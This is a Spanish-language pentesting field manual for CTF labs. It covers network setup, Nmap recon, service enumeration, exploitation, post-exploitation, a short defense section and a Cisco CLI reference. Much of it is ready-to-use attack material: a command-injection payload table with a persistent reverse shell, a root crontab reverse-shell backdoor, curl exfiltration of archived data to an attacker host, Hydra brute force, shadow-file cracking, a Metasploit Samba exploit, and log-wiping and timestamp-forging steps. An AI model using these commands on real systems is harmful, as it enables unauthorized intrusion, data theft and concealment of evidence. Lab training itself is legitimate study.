# 📖 Guía Maestra de Pentesting, Redes y Defensa v2.0
*Síntesis y Metodología de Élite para Operaciones de Ciberseguridad - Versión Corregida y Aumentada*

---

## 🎯 MISIÓN Y FILOSOFÍA DE DISEÑO (KISS / TL;DR)
Este manual consolida, enriquece y ordena la inteligencia de campo que ha recopilado. Su propósito es ser una guía de referencia única, desde la configuración del entorno hasta la exfiltración y defensa, eliminando ambigüedades y siguiendo un flujo operativo lógico. Se abordan directamente sus puntos de frustración sobre el descubrimiento de redes y la conectividad.

**Directiva v2.0:** Fusión total del material de origen. Cero omisiones. Enriquecimiento de la información existente para crear un manual de campo verdaderamente exhaustivo.

---

## 📡 FASE 0: CONFIGURACIÓN DEL LABORATORIO Y CONECTIVIDAD
*Esta sección resuelve las dudas fundamentales sobre el descubrimiento de la red y la máquina objetivo.*

### 1. El Dilema de la Red: ¿NAT, Red Interna o VPN?

Usted preguntó cómo descubrir su red y la máquina CTF. La respuesta depende del escenario.

*   **Escenario 1: Laboratorio Local (Máquinas Virtuales en su PC)**
    *   **Método Recomendado:** **Red NAT Personalizada** (como en su `pentesting3.md`) o **Red Interna** en VirtualBox/VMware.
    *   **¿Por qué?** Crea una red aislada y controlada solo para sus máquinas (atacante y víctima). Usted define el rango de red (ej: `192.168.1.0/24`), por lo que **no hay necesidad de "descubrir" la red**, usted ya la conoce.
    *   **Descubrimiento del Host:** Una vez en la misma red, el descubrimiento del host objetivo se simplifica a un escaneo de ping o ARP en ese rango conocido.

*   **Escenario 2: Plataformas Externas (Hack The Box, TryHackMe)**
    *   **Método Obligatorio:** **Conexión VPN.**
    *   **¿Qué es el archivo `.ovpn`?** Es un archivo de configuración de OpenVPN. Estas plataformas le proporcionan este archivo para que usted pueda crear un túnel seguro y cifrado desde su máquina Kali directamente a la red del laboratorio de ellos.
    *   **¿Cómo funciona?**
        1.  Usted ejecuta `sudo openvpn su_archivo.ovpn`.
        2.  Su máquina obtiene una nueva interfaz de red virtual (generalmente `tun0`) con una IP en la red de la plataforma (ej: `10.10.14.5`).
        3.  La máquina CTF que le asignan (ej: `10.10.10.3`) está en esa misma red remota.
        4.  **Descubrimiento:** No necesita descubrir la red. La plataforma le da la IP del objetivo. Su única tarea es verificar la conectividad con `ping 10.10.10.3`.

### 1.2. Configuración Práctica de Red (Fusión de Guías)

Esta tabla fusiona los comandos de configuración de red de sus guías para un flujo de trabajo completo.

| Tarea | Comando / Método | Función y Notas Clave |
|---|---|---|
| **1. Ver Nombres de Interfaz** | `ip a` | Muestra los nombres de tus interfaces (ej: eth0, enp0s3). |
| **2. Asignar IP Temporal** | `sudo ip addr add [IP]/[CIDR] dev [interfaz]` | Asigna una IP que se pierde al reiniciar. Ej: `192.168.1.150/24 dev eth0`. |
| **3. Asignar IP Permanente (Netplan)** | 1. `ls /etc/netplan/`<br/>2. `sudo nano /etc/netplan/[archivo].yaml`<br/>3. `sudo netplan apply` | Método estándar en Ubuntu moderno para configuración persistente. |
| **4. Asignar IP Permanente (Interfaces)** | `sudo nano /etc/network/interfaces` | Método antiguo. Añadir: `iface [interfaz] inet static`, `address [IP]`, `netmask [Máscara]`, `gateway [Gateway]`. |

--- 

## 🔍 FASE 1: RECONOCIMIENTO
*Metodología unificada para el mapeo de la superficie de ataque.*

### 1.1. Reconocimiento Básico y Conectividad

Esta tabla, extraída de su `pentesting2.md`, establece la base del reconocimiento.

| Tarea | Linux / macOS | Windows | Función y Desglose de Opciones |
|---|---|---|---|
| Ver mi propia IP y MAC | `ip a` / `ifconfig` | `ipconfig /all` | Muestra IP, MAC, DNS. `/all` = todo. |
| Verificar si una IP responde | `ping [IP]` | `ping [IP]` | `-c [num]` (Linux), `-t` (Win). |
| Trazar ruta a un destino | `traceroute [IP]` | `tracert [IP]` | `-n` (Lnx), `-d` (Win). |
| Ver tabla de vecinos | `ip n` / `arp -a` | `arp -a` | Muestra tabla ARP. |
| Descubrir hosts locales | `sudo nmap -sn [Rango]` | `nmap -sn [Rango]` | `-sn` = Ping Scan. |
| Consultar info dominio | `whois [dominio]` | `whois [dominio]` | Registro público. |
| Consultar DNS | `nslookup` / `dig` | `nslookup` | `dig -x`, `dig [dominio] MX`. |

### 1.2. Descubrimiento Activo de Red

```bash
# Conexión VPN a entorno objetivo (HTB, TryHackMe, etc.)
sudo openvpn archivo.ovpn

# Verificación de interfaz VPN y mi IP
ifconfig tun0

# Descubrimiento de hosts activos en rango con Nmap
sudo nmap -sn [rango_red]
# EJEMPLOS PRÁCTICOS:
sudo nmap -sn 192.168.1.0/24
sudo nmap -sn 10.10.10.0/24

# Métodos Alternativos de Descubrimiento
# Usando ARP (red local, más sigiloso)
arp-scan -l

# Usando TCP SYN a puertos comunes (evade bloqueo de ICMP)
sudo nmap -PS22,80,443 192.168.1.0/24
```

--- 

## 🔬 FASE 2: ESCANEO Y ENUMERACIÓN
*Análisis profundo de los hosts descubiertos.*

### 2.1. Escaneo Completo de Puertos y Servicios

```bash
# Escaneo completo de todos los puertos TCP, rápido y con output grepeable
nmap -p- --open -sS --min-rate 5000 -n -Pn [IP_objetivo] -oG allPorts

# Procesamiento para extraer puertos a formato CSV
cat allPorts | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ','
# RESULTADO ESPERADO: 21,22,80,139,445

# Escaneo detallado con scripts y versiones sobre los puertos encontrados
nmap -p [puertos_encontrados] -sC -sV [IP_objetivo] -oN targeted
# EJEMPLO: nmap -p 21,22,80,139,445 -sC -sV 10.10.10.3 -oN targeted
```

### 2.2. Análisis de Puertos, Procesos y Servicios (Tabla Maestra)

Esta tabla, extraída de su `pentesting2.md`, es crucial para el análisis de un host.

| Tarea | Linux / macOS | Windows | Función y Desglose de Opciones Clave |
|---|---|---|---|
| Vista General: Ver todas conexiones y puertos | `sudo ss -tunap` o `sudo netstat -tunap` | `netstat -ano` | Muestra lista completa de conexiones y puertos. |
| Diagnóstico Clave: Ver solo servicios en escucha | `sudo ss -tuln` o `sudo netstat -tuln` | `netstat -ano \| findstr "LISTENING"` | Ver servicios activos en la máquina. |
| Filtrado por Estado: Ver solo conexiones activas | `ss -tn state established` | `netstat -an \| findstr "ESTABLISHED"` | Muestra conexiones en uso, ignora puertos esperando. |
| Acción Principal: Buscar proceso que usa un puerto | `sudo ss -tulnp \| grep [PUERTO]` | `netstat -ano \| findstr "[PUERTO]"` | Obtiene PID del proceso que ocupa el puerto. |
| Paso Final: Liberar puerto matando proceso | `sudo kill -9 [PID]` | `taskkill /PID [PID] /F` | Libera puerto a la fuerza. |
| Investigación 1: Ver nombre proceso por PID | `ps -p [PID] -o comm=` | `tasklist /FI "PID eq [PID]"` | Muestra programa a matar antes de usar kill. |
| Verificación Remota: Probar si puerto abierto | `nc -zv [IP] [PUERTO]` o `telnet [IP] [PUERTO]` | `telnet [IP] [PUERTO]` | Prueba conectividad. Pantalla negra = abierto; error = cerrado.|

### 2.3. Enumeración Específica por Protocolo

#### FTP (Puerto 21)
```bash
# Intentar login anónimo
ftp [IP_objetivo]  # (user: anonymous, pass: anonymous)

# Scripts de enumeración y vulnerabilidades FTP con Nmap
nmap -p 21 --script ftp-anon,ftp-bounce,ftp-proftpd-backdoor [IP]
```

#### SSH (Puerto 22)
```bash
# Banner grabbing manual
nc [IP] 22

# Enumeración de algoritmos y usuarios con Nmap
nmap -p 22 --script ssh-enum-algos,ssh-enum-users --script-args userdb=users.txt [IP]
```

#### SMB/NetBIOS (Puertos 139, 445)
```bash
# Listado de recursos compartidos (sin autenticación)
smbclient -L //[IP_objetivo] -N

# Enumeración completa y exhaustiva con enum4linux
enum4linux -a [IP_objetivo]

# Scripts NSE para enumeración y vulnerabilidades SMB
nmap -p 445 --script smb-enum-shares,smb-enum-users,smb-vuln* [IP]
```

--- 

## ⚔️ FASE 3: EXPLOTACIÓN
*Obtención de acceso inicial al sistema objetivo.*

### 3.1. Búsqueda y Análisis de Vulnerabilidades

| Tarea | Herramienta | Función y Desglose de Opciones |
|---|---|---|
| Escaneo Profundo | nmap | `-sS`, `-sV`, `-O`, `-p-`, `-A` |
| Vulnerabilidades Web | nikto | `-h`: especifica host |
| Inyección SQL | sqlmap | `-u`, `--dbs`, `--batch` |
| Explotación | msfconsole | `search`, `use`, `set RHOSTS`, `exploit` |

```bash
# Búsqueda por servicio y versión con searchsploit
searchsploit samba 3.0.20

# Copiar exploit para análisis y modificación
searchsploit -m [ID_exploit]

# Búsqueda de módulos en Metasploit
msfconsole -q
search type:exploit platform:linux samba

# Configuración y ejecución de exploit
use exploit/multi/samba/usermap_script
set RHOSTS [IP_objetivo]
set LHOST [IP_atacante]
exploit
```

### 3.2. Ataques de Fuerza Bruta con Hydra

```bash
# Ataque de fuerza bruta SSH
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://[IP_objetivo]

# Ataque a formulario web (HTTP POST)
hydra -L users.txt -P passwords.txt [IP] http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect"
```

### 3.3. Cracking de Hashes con John the Ripper

```bash
# Combinación de archivos del sistema para John
unshadow /etc/passwd /etc/shadow > hashes.txt

# Ataque con diccionario específico
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Cracking con reglas avanzadas (mutaciones)
john --rules --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Mostrar passwords crackeados
john --show hashes.txt
```

### 3.4. Payloads de Inyección de Comandos (Tabla Consolidada)

| Payload de Ejemplo | Función |
|---|---|
| `127.0.0.1; whoami` | Ver usuario del proceso. |
| `127.0.0.1; uname -a` | Ver info sistema. |
| `127.0.0.1 && id` | Ejecuta `id` si el comando anterior tuvo éxito. |
| `127.0.0.1; sleep 5 && echo "test"` | Blind injection por tiempo. |
| `127.0.0.1; nohup bash -c 'bash -i >& /dev/tcp/IP/PUERTO 0>&1' &` | Reverse shell persistente en segundo plano. |

--- 

## 🚀 FASE 4: POST-EXPLOTACIÓN
*Una vez dentro, el objetivo es escalar privilegios y expandir el control.*

### 4.1. Reconocimiento Post-Explotación

```bash
# Verificación de identidad y privilegios
whoami
id

# Información del sistema operativo
uname -a
cat /etc/os-release

# Enumeración de usuarios del sistema
cat /etc/passwd

# Procesos en ejecución
ps aux

# Análisis de red interna desde host comprometido
netstat -tupln
arp -a
```

### 4.2. Escalación de Privilegios

```bash
# Verificación de permisos sudo (vector de escalación clave)
sudo -l

# Búsqueda de binarios SUID
find / -perm -u=s -type f 2>/dev/null

# Búsqueda de tareas programadas
crontab -l
cat /etc/crontab

# Explotación de Sudo/SUID (Referencia GTFOBins)
sudo nmap --interactive
nmap> !sh

# Scripts de Automatización para Escalación (muy recomendados)
# LinEnum: Enumeración automatizada
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh && ./LinEnum.sh

# LinPEAS: Análisis exhaustivo y con colores
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

### 4.3. Técnicas de Persistencia y Movimiento Lateral

```bash
# Persistencia via crontab
echo "*/10 * * * * /bin/bash -c 'bash -i >& /dev/tcp/[IP_atacante]/4444 0>&1'" >> /var/spool/cron/root

# Túnel dinámico (SOCKS Proxy) para pivoting
ssh -D 9050 user@[IP_objetivo]

# Configuración de proxychains para usar el túnel
# (Editar /etc/proxychains4.conf y añadir "socks5 127.0.0.1 9050")
proxychains nmap -sT -Pn [IP_objetivo_interno]
```

### 4.4. Búsqueda de Información Sensible y Exfiltración

```bash
# Buscar archivos de configuración con credenciales
find / -type f -name "*.conf" -exec grep -l "password" {} \; 2>/dev/null

# Localizar claves SSH privadas
find / -name "id_rsa" 2>/dev/null

# Análisis de historial de comandos
cat /root/.bash_history 2>/dev/null

# Compresión y exfiltración de datos via HTTP
tar -czf /tmp/data.tar.gz /var/www
curl -X POST -F "file=@/tmp/data.tar.gz" http://[IP_atacante]:8000/upload
```

### 4.5. Limpieza de Evidencias

```bash
# Limpieza de historial de comandos
history -c && echo "" > ~/.bash_history && unset HISTFILE

# Limpieza de logs del sistema (¡ruidoso!)
echo "" > /var/log/auth.log

# Manipulación de timestamps para ocultar archivos
touch -r /bin/ls /path/to/malicious/file
```

--- 

## 🛡️ FASE 5: DEFENSA Y DETECCIÓN
*Principios para asegurar la infraestructura.*

### 5.1. Detección de Actividad Maliciosa

```bash
# Monitoreo de intentos de autenticación en tiempo real
tail -f /var/log/auth.log | grep -i "failed\|invalid"

# Identificar archivos modificados recientemente (último día)
find / -type f -mtime -1 2>/dev/null

# Verificar integridad de binarios críticos (comparar con backups)
md5sum /bin/ls
```

### 5.2. Hardening y Protección

```bash
# Configuración de Firewall (iptables) para bloquear IP
iptables -A INPUT -s [IP_maliciosa] -j DROP

# Configuración SSH Segura (/etc/ssh/sshd_config)
PermitRootLogin no
PasswordAuthentication no

# Aplicar cambios de SSH
systemctl restart sshd
```

--- 

## 🌐 FASE 6: INFRAESTRUCTURA DE RED Y CISCO (FUSIÓN DE GUÍAS)

### 6.1. Fundamentos de la CLI de Cisco

| Modo | Prompt Típico | Propósito Principal |
|---|---|---|
| EXEC del Usuario | `Router>` | Vista limitada, comandos básicos. |
| EXEC Privilegiado | `Router#` | Acceso completo ("admin"). |
| Configuración Global | `Router(config)#` | Cambios que afectan a todo el dispositivo. |
| Configuración de Interfaz | `Router(config-if)#` | Configurar interfaz específica. |

| Tarea | Comando / Tecla | Función TL;DR |
|---|---|---|
| Entrar a modo privilegiado | `enable` | `Router>` → `Router#` |
| Entrar a modo configuración | `configure terminal` o `conf t` | `Router#` → `Router(config)#` |
| Salir un nivel | `exit` | `(config-if)#` → `(config)#` |
| Obtener ayuda contextual | `?` | Muestra comandos/opciones disponibles. |
| Completar un comando | `Tab` | Autocompleta un comando. |

### 6.2. Configuración de Dispositivos y VLANs

| Tarea | Comando(s) | Modo | Función TL;DR |
|---|---|---|---|
| Crear y nombrar una VLAN | `vlan [número]`<br/>`name [nombre_vlan]` | `(config)#` | Crea VLAN y le asigna nombre. |
| Asignar puerto a VLAN (Acceso) | `interface [nombre_puerto]`<br/>`switchport mode access`<br/>`switchport access vlan [número]` | `(config)#` | Conecta dispositivo a VLAN específica. |
| Configurar puerto Troncal (Trunk) | `interface [nombre_puerto]`<br/>`switchport mode trunk` | `(config)#` | Conecta switch/router, permite múltiples VLANs. |
| Guardar Configuración | `copy running-config startup-config` | `#` | **CRUCIAL:** Guarda los cambios para que persistan.|

### 6.3. Enrutamiento Inter-VLAN (Router on a Stick)

| Tarea | Comando(s) | Modo | Función TL;DR |
|---|---|---|---|
| 1. Activar interfaz física | `interface [nombre_interfaz]`<br/>`no shutdown` | `(config)#` | Enciende puerto físico del router (sin IP). |
| 2. Crear Subinterfaz VLAN | `interface [nombre_interfaz].[sub-id]` | `(config)#` | Crea interfaz virtual para VLAN. |
| 3. Asignar VLAN y Encapsulación | `encapsulation dot1q [número_vlan]` | `(config-subif)#` | Define etiqueta VLAN (dot1q) para subinterfaz. |
| 4. Asignar IP a Subinterfaz | `ip address [IP_gateway] [Máscara]` | `(config-subif)#` | IP para gateway de dispositivos VLAN. |

### 6.4. Diagnóstico y Verificación (Comandos `show`)

| Tarea | Comando show | Modo | Función TL;DR |
|---|---|---|---|
| Resumen rápido interfaces | `show ip interface brief` | `#` | Muestra IPs y estado (up/up o down/down). **El más útil.** |
| Estado físico de puertos | `show interfaces status` | `#` | Muestra estado, VLAN, dúplex, velocidad. |
| Resumen VLANs y puertos | `show vlan brief` | `#` | Muestra VLANs y puertos asociados. |
| Ver puertos troncales | `show interfaces trunk` | `#` | Lista puertos en modo trunk y VLANs permitidas. |
| Ver tabla MAC del switch | `show mac address-table` | `#` | Muestra MACs aprendidas, puerto y VLAN. |
| Ver tabla enrutamiento | `show ip route` | `#` | Confirma rutas conocidas por router. `C`=Conectada, `L`=Local. |

--- 

## 📊 APÉNDICE: GLOSARIOS Y REFERENCIAS CONSOLIDADAS

### Glosario Consolidado de Flags y Parámetros

#### nmap (Network Mapper)
| Flag | Función Académica | Fundamento Técnico |
|---|---|---|
| `-sS` | SYN Scan (Half-Open) | Escaneo sigiloso, no completa handshake TCP. |
| `-sV` | Version Detection | Fingerprinting de servicios via banners. |
| `-sC` | Script Scan | Ejecuta NSE scripts por defecto. |
| `-O` | OS Detection | Fingerprinting de sistema operativo. |
| `-p-` | All Ports | Escanea 65,535 puertos TCP. |
| `-A` | Aggressive Scan | Combinación: -sV, -sC, -O, --traceroute. |
| `--min-rate` | Packet Rate | Velocidad mínima de envío (pps). |
| `-n` | No DNS Resolution | Optimización de velocidad. |
| `-Pn` | No Ping | Asumir host activo, saltar descubrimiento. |
| `-sn` | Ping Scan | Solo descubrimiento de hosts, sin escaneo de puertos. |

#### Hydra (Brute Force)
| Flag | Función Académica | Aplicación Práctica |
|---|---|---|
| `-L` | User List | Lista de usuarios objetivo. |
| `-l` | Single User | Usuario específico. |
| `-P` | Password List | Diccionario de passwords. |
| `-p` | Single Password | Password específico. |
| `-t` | Threads | Número de conexiones paralelas. |
| `-w` | Wait Time | Delay entre intentos (segundos). |
| `-v` | Verbose | Output detallado del progreso. |
| `-f` | Fast Mode | Parar al encontrar primera credencial válida. |

#### John the Ripper (Hash Cracking)
| Parámetro | Función Académica | Fundamento Criptográfico |
|---|---|---|
| `--wordlist` | Dictionary Attack | Ataque basado en passwords comunes. |
| `--rules` | Rule-based Attack | Mutaciones algorítmicas de wordlist. |
| `--format` | Hash Format | Especificar algoritmo criptográfico. |
| `--show` | Display Results | Mostrar passwords crackeados. |
| `--incremental` | Brute Force | Generación exhaustiva de combinaciones. |

#### netstat/ss (Network Statistics)
| Flag | Función Linux/macOS | Función Windows | Propósito Académico |
|---|---|---|---|
| `-t` | TCP sockets | `-p TCP` | Filtrar protocolo TCP únicamente. |
| `-u` | UDP sockets | `-p UDP` | Filtrar protocolo UDP únicamente. |
| `-l` | Listening only | `findstr "LISTENING"` | Solo servicios en escucha. |
| `-n` | Numeric format | `-n` | No resolver nombres (optimización). |
| `-p` | Process info | `-o` | Mostrar PID y nombre de proceso. |
| `-a` | All sockets | `-a` | Mostrar todos los estados de conexión. |

### Tabla Maestra de Conflictos de Puertos (Fusionada)

| Puerto | Desarrollo Web y Datos | Herramientas de Ataque / Apps Vulnerables | Herramientas de Defensa / Monitoreo y Ops |
|---|---|---|---|
| 3000 | React, Next.js, Vue, Node.js | OWASP Juice Shop | Grafana |
| 8080 | Tomcat, Servidores Java | OWASP ZAP, Burp Suite, Web Goat | Kibana, Jenkins |
| 8000 | Django, Gunicorn, Jupyter | — | Kong(proxy), Splunk |
| 5000 | Flask, Streamlit | Empire, Starkiller(API) | — |
| 9200 | — | — | Elasticsearch |
| 5601 | — | — | Kibana |
| 9090 | — | — | Prometheus |
| 4444 | — | Reverse Shells (Metasploit default) | — |
